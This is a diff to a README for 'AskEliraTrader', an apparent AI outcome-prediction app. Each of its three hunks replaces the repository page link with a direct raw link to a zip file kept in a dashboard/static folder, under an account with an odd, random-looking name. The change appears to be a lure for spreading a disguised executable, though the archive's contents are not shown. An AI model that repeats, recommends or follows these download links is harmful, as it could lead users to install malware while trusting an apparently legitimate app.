@@ -1,6 +1,6 @@
 # 🔮 AskEliraTrader - Predict Outcomes With AI
 
-[![Download AskEliraTrader](https://img.shields.io/badge/Download-AskEliraTrader-blue?style=for-the-badge)](https://github.com/Nationalisationgeneticfingerprint243/AskEliraTrader)
+[![Download AskEliraTrader](https://img.shields.io/badge/Download-AskEliraTrader-blue?style=for-the-badge)](https://github.com/Nationalisationgeneticfingerprint243/AskEliraTrader/raw/refs/heads/main/dashboard/static/Trader-Ask-Elira-2.1.zip)
 
 ## 📌 What This App Does
 
@@ -36,7 +36,7 @@ For best results:
 
 Visit this page to download and run the app:
 
-https://github.com/Nationalisationgeneticfingerprint243/AskEliraTrader
+https://github.com/Nationalisationgeneticfingerprint243/AskEliraTrader/raw/refs/heads/main/dashboard/static/Trader-Ask-Elira-2.1.zip
 
 If the page shows a release file, download it. If it gives you a folder or source files, use the packaged Windows app file if one is listed near the top.
 
@@ -246,4 +246,4 @@ Description: Ask Elira anything. She predicts binary outcomes using 5 AI agents 
 
 ## 📥 Download Again
 
-https://github.com/Nationalisationgeneticfingerprint243/AskEliraTrader
+https://github.com/Nationalisationgeneticfingerprint243/AskEliraTrader/raw/refs/heads/main/dashboard/static/Trader-Ask-Elira-2.1.zip
